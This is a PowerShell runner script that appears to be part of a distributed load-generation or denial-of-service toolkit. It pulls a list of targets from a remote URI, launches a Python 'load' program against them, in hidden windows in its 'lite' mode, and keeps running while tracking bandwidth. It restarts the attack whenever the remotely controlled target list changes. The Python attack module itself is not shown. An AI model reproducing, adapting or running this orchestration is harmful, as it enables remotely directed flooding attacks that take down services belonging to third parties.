#[console]::TreatControlCAsInput = $true
$host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
$host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green

[xml]$XMLConfig = Get-Content -Path ("settings.xml");
$ActionPreference = $XMLConfig.config.erroraction;
$ErrorActionPreference = $ActionPreference;
$ProgressPreference = $ActionPreference;
$WarningPreference = $ActionPreference;
[string] $SystemDrive = $(Get-CimInstance Win32_OperatingSystem | Select-Object SystemDirectory).SystemDirectory;
$SystemDrive = $SystemDrive.Substring(0, 2);
$InstallFolder = $XMLConfig.config.folders.install;
$RootDir = $SystemDrive + "\" + $InstallFolder;
Set-Location $RootDir;
. "$RootDir\\functions.ps1";

$PythonPath = $("$RootDir\$($XMLConfig.config.folders.python)\");
$PythonExe = $PythonPath + "python.exe";
$LoadPath = $("$RootDir\$($XMLConfig.config.folders.load)\");
$LoadFileName = $LoadPath + $($XMLConfig.config.mainloadfile);
$BogusInitPyPath = $LoadPath + "src\__init__.py";
if (Test-Path $BogusInitPyPath) {
    Remove-Item $BogusInitPyPath -Force | Out-Null;
}
$TargetsURI = $XMLConfig.config.links.targets;
$LiteBlockSize = [Int] $XMLConfig.config.liteblocksize;
$MinutesPerBlock = $XMLConfig.config.timers.minutesperblock;


$RunnerVersion = "1.0.0 Prebeta / Winged ratel";


if ($args -like "*-lite*") {
    $RunningLite = $true;
}
else {
    $RunningLite = $false;
}


Clear-Host;
$BannerURL = $XMLConfig.config.links.banner;
$Banner = Get-Banner $BannerURL;
Write-Host $Banner;
$StartupMessage = "$($XMLConfig.config.messages.runnerstart) $RunnerVersion";
if ($RunningLite) {
    $StartupMessage = $StartupMessage + " Lite";
}
Write-Host $StartupMessage;
Write-Host "$($XMLConfig.config.messages.presstoexit)"
Set-Location $RootDir;

Stop-Runners $LoadPath $PythonExe;

$TargetList = @()
$TargetList = Get-Targets $TargetsURI $RunningLite;
$StopRequested = $false;
$StartTask = $true;
$Targets = @()
$Globalargs = $XMLConfig.config.baseloadargs;
Set-Location $LoadPath;
[System.Diagnostics.Process] $PyProcess = $null;

while (-not $StopRequested) {
    #TODO: split BIG load to a smaller ones
    #TODO: think out condition when to do that
    if ($StartTask -and (-not $RunningLite)) {
        $TargetList -join "`r`n" | Out-File -Encoding UTF8 -FilePath "$LoadPath\targets.txt" -Force | Out-Null;
        $TargetString = $("-c $LoadPath\targets.txt");
        $RunnerArgs = $("$LoadFileName $Globalargs $TargetString");
        $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $LoadPath -ArgumentList $RunnerArgs -PassThru;
        $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
        $StartTask = $false;
    }

    if ($StartTask -and $RunningLite) {
        $Targets = Get-SlicedArray $TargetList $LiteBlockSize;
        foreach ($Target in $Targets) {
            if ($Target.Count -gt 0) {
                $TargetString = $Target -join ' ';
                $RunnerArgs = $("$LoadFileName $Globalargs -t $LiteBlockSize $TargetString");
                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $LoadPath -WindowStyle Hidden -ArgumentList $RunnerArgs -PassThru;
                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                $StartedBlockJob = [System.DateTime]::Now;
                $StopBlockJob = $StartedBlockJob.AddMinutes($MinutesPerBlock);
                $Now = [System.DateTime]::Now;
                if (-not (Get-Process -Id $PyProcess.Id)) {
                    $PythonExited = $true
                }
                while ((-not $PythonExited) -and ($StopBlockJob -gt $Now)) {
                    $Now = [System.DateTime]::Now;
                    if (-not (Get-Process -Id $PyProcess.Id)) {
                        $PythonExited = $true;
                        break;
                    }
                    $BlockJobLeft = [int] $($StopBlockJob - [System.DateTime]::Now).TotalMinutes;
                    $Message = $XMLConfig.config.messages.targets + `
                        ": $($Target.Count) " + `
                        $XMLConfig.config.messages.cpu + `
                        ": $(Get-CpuLoad)`% " + `
                        $XMLConfig.config.messages.memory + `
                        ": $(Get-FreeRamPercent)`% " + `
                        $XMLConfig.config.messages.tillupdate + `
                        ": $BlockJobLeft " + `
                        $XMLConfig.config.messages.minutes + `
                    $(" $(Measure-Bandwith) $($XMLConfig.config.messages.network)");
                    Clear-Line $Message;
                    Start-Sleep -Seconds 5;
                }
                Stop-Tree $PyProcess.Id;
                $Message = $XMLConfig.config.messages.litedone;
                Clear-Line $("$($Target.Count) $Message");
            }
        }
        $StartTask = $false;
    }
    if (-not (Get-Process -Id $PyProcess.Id)) {
        $PythonExited = $true
    }
    if (!$RunningLite) {
        $StopCycle = [System.DateTime]::Now.AddMinutes($MinutesPerBlock);
        while (($StopCycle -gt $Now) -and (-not $PythonExited)) {
            $Now = [System.DateTime]::Now;
            if (-not (Get-Process -Id $PyProcess.Id)) {
                $PythonExited = $true
                break;
            }
            $BlockJobLeft = [int] $($StopCycle - [System.DateTime]::Now).TotalMinutes;
            $Message = $XMLConfig.config.messages.targets + `
                ": $($TargetList.Count) " + `
                $XMLConfig.config.messages.cpu + `
                ": $(Get-CpuLoad)`% " + `
                $XMLConfig.config.messages.memory + `
                ": $(Get-FreeRamPercent)`% " + `
                $XMLConfig.config.messages.tillupdate + `
                ": $BlockJobLeft " + `
                $XMLConfig.config.messages.minutes + `
            $(" $(Measure-Bandwith) $($XMLConfig.config.messages.network)");
            Clear-Line $Message;
        }
        $NewTargetList = Get-Targets $TargetsURI $RunningLite;
        if ($TargetList.Count -eq $NewTargetList.Count) {
            $StartTask = $false;
        }
        else {
            $TargetList = $NewTargetList;
            Stop-Runners $LoadPath $PythonExe;
            $StartTask = $true;
        }
    }

    if ($RunningLite) {
        $TargetList = Get-Targets $TargetsURI $RunningLite;
        Stop-Runners $LoadPath $PythonExe;
    }
    if($PythonExited){
        $StartTask = $true;
    }
}
